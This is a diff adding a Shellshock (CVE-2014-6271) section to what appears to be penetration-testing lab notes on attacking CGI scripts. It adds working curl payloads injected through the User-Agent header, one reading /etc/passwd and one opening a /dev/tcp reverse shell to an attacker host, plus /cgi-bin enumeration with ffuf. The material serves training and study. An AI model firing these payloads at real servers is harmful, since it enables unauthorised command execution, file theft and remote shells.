@@ -36,6 +36,10 @@ This document outlines common techniques for identifying and exploiting vulnerab
 
   - [Common Gateway Interfaces](#common-gateway-interfaces)
     - [Attacking Tomcat CGI](#attacking-tomcat-cgi)
+    - [Attacking CGI Applications](#attacking-cgi-applications)
+  
+  - [Thick Client Applications](#thick-client-applications)
+    - [Attacking Thick Client Applications](#attacking-thick-client-applications)
 
 
 ---
@@ -1690,3 +1694,87 @@ http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.ex
 This confirms arbitrary command execution under the Tomcat service account.
 
 ---
+
+### Attacking CGI Applications
+
+The **Common Gateway Interface (CGI)** allows a web server to execute external programs and generate dynamic content in response to user requests. CGI applications typically act as a bridge between the web server and underlying system utilities or services.
+
+CGI scripts execute in the **security context of the web server process**, making them high-impact targets when misconfigured or vulnerable. They are commonly used for functionality such as:
+
+- Web forms (email, feedback, registration)
+- Guest books
+- Search features
+- Legacy administrative scripts
+
+Because CGI scripts often pass user-controlled input to the operating system, they have historically been a frequent source of **command injection vulnerabilities**.
+
+
+
+One of the most well-known CGI vulnerabilities is called `Shellshock` ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)). This vulnerability affects Bash versions `4.3` and earlier and allows attackers to execute arbitrary commands by **injecting malicious payloads into environment variables**.
+
+The issue arises from the way vulnerable versions of Bash parse environment variables containing **function definitions**. When such a variable is imported, Bash incorrectly continues parsing and executes any commands appended after the function definition.
+
+Shellshoc PoC:
+
+```bash
+env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+```
+
+Explanation:
+
+- `y='() { :;};'` defines a Bash function that performs no action
+- `echo vulnerable-shellshock` is appended after the function definition
+- On vulnerable systems, Bash executes the appended command
+- On patched systems, only `not vulnerable` is printed
+
+To identify potential CGI scripts, we enumerate the `/cgi-bin` directory using `ffuf`:
+
+```bash
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://10.129.205.27/cgi-bin/FUZZ -e .cgi -ic
+```
+
+A valid CGI script is discovered:
+
+```
+access.cgi
+```
+
+![Filtered output](images/cgi.PNG)
+
+Accessing the script directly does not return meaningful output:
+
+```bash
+curl -i http://10.129.205.27/cgi-bin/access.cgi
+```
+
+![Filtered output](images/cgi2.PNG)
+
+Despite the lack of visible functionality, the script may still process HTTP headers—making it a viable target for Shellshock.
+
+To test for Shellshock, we inject a payload into the `User-Agent` HTTP header, which is commonly exposed to CGI environment variables:
+
+```bash
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
+```
+
+The contents of `/etc/passwd` are returned, confirming the system is vulnerable:
+
+![Filtered output](images/cgi3.PNG)
+
+With command execution confirmed, we can obtain a reverse shell by injecting a Bash payload:
+
+```bash
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.120/1337 0>&1' http://10.129.205.27/cgi-bin/access.cgi
+```
+
+A reverse shell connection is successfully established:
+
+![Filtered output](images/cgi4.PNG)
+
+---
+
+## Thick Client Applications
+
+---
+
+### Attacking Thick Client Applications
